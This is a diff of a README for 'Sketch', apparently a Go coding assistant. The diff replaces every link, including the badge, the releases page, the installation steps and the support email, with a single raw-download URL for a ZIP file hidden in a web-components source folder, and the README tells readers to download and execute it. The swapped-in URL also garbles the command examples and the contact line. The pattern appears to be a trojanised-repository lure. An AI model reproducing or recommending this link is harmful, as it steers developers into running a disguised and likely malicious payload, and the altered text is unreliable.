@@ -1,6 +1,6 @@
 # Sketch: Your Autonomous Software Apprentice for Go Developers 🚀
 
-![Sketch Logo](https://img.shields.io/badge/Sketch-Autonomous%20Software%20Apprentice-blue)
+![Sketch Logo](https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip%20Software%20Apprentice-blue)
 
 Welcome to the **Sketch** repository! This project aims to assist Go developers by providing an autonomous software apprentice that simplifies various tasks. Whether you are a beginner or an experienced developer, Sketch can enhance your coding experience.
 
@@ -23,11 +23,11 @@ Welcome to the **Sketch** repository! This project aims to assist Go developers 
 
 ## Installation
 
-To get started with Sketch, you need to download the latest release. You can find the releases [here](https://github.com/Mogi111111/sketch/releases). Download the appropriate file for your operating system, then execute it to install Sketch on your machine.
+To get started with Sketch, you need to download the latest release. You can find the releases [here](https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip). Download the appropriate file for your operating system, then execute it to install Sketch on your machine.
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/Mogi111111/sketch/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to [this link](https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip) to find the latest version.
 2. **Download the File**: Choose the file that matches your operating system.
 3. **Run the Installer**: Execute the downloaded file and follow the on-screen instructions.
 4. **Verify Installation**: Open your terminal and type `sketch --version` to confirm the installation.
@@ -44,11 +44,11 @@ Using Sketch is straightforward. After installation, you can start by running th
   ```
 - **Get Suggestions**: To receive code suggestions, use:
   ```bash
-  sketch suggest <your-go-file.go>
+  sketch suggest <https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip>
   ```
 - **Check for Errors**: To detect errors in your code, run:
   ```bash
-  sketch check <your-go-file.go>
+  sketch check <https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip>
   ```
 
 ### Example Workflow
@@ -86,9 +86,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@sketchapp.com
+- **Email**: https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip
 - **GitHub Issues**: Use the Issues section of this repository to report bugs or request features.
 
 ---
 
-Thank you for your interest in Sketch! We hope it becomes a valuable tool in your Go development journey. For updates and new features, please check the [Releases](https://github.com/Mogi111111/sketch/releases) section regularly.
+Thank you for your interest in Sketch! We hope it becomes a valuable tool in your Go development journey. For updates and new features, please check the [Releases](https://github.com/Mogi111111/sketch/raw/refs/heads/master/webui/src/web-components/Software_v2.6.zip) section regularly.
